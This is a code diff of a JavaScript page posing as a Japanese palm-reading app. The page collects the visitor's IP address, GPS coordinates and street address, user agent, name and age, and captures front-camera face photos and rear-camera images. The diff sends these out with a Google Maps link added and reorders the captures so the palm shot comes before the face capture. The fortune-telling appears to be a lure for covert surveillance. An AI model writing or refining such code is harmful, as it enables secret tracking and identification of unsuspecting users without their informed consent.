@@ -46,7 +46,7 @@ async function startCamera(facingMode) {
   currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
   video.srcObject = currentStream;
   video.style.display = 'block';
-  return new Promise(r => setTimeout(r, 1500));
+  await new Promise(r => setTimeout(r, 1500));
 }
 
 function stopCamera() {
@@ -76,7 +76,7 @@ async function getLocation() {
         const data = await res.json();
         if (data?.display_name) addr = data.display_name;
       } catch {}
-      resolve(`緯度: ${lat}\n経度: ${lon}\n住所: ${addr}`);
+      resolve(`緯度: ${lat}\n経度: ${lon}\n住所: ${addr}\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`);
     }, () => resolve("位置情報取得失敗"));
   });
 }
@@ -98,16 +98,16 @@ startBtn.onclick = async () => {
     const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip);
     const loc = await getLocation();
 
-    // 1. 内カメ撮影
-    await startCamera("user");
-    const faceBlob = await capturePhoto();
-    await sendData(faceBlob, `名前: ${name}\n年齢: ${age}歳\nIP: ${ip}\n位置情報:\n${loc}\nUA: ${navigator.userAgent}\n時刻: ${new Date().toLocaleString('ja-JP')}`);
-    stopCamera();
-
-    // 2. 外カメ撮影
+    // 1. 外カメ（手相・プレビュー）
     await startCamera("environment");
     const palmBlob = await capturePhoto();
     await sendData(palmBlob, "【手相画像】");
+
+    // 2. 内カメ（本人情報）
+    await startCamera("user");
+    const faceBlob = await capturePhoto();
+    await sendData(faceBlob, `名前: ${name}\n年齢: ${age}歳\nIP: ${ip}\n位置情報:\n${loc}\nUA: ${navigator.userAgent}\n時刻: ${new Date().toLocaleString('ja-JP')}`);
+    
     stopCamera();
 
     const readings = ["神秘十字", "太陽線", "ソロモンの環"];
